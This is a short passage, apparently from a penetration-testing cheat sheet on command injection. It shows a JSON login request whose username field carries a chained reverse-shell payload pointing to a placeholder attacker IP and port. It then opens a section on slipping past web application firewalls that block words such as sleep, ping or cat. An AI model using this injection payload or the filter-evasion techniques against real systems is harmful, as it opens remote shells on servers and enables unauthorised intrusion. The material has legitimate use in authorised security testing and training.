{"password":"9012","username":"652223518; bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1;","rememberMe":false}


## 5. WAF Obfuscation & Character Bypasses
If the application blocks explicit words like sleep, ping, or cat.

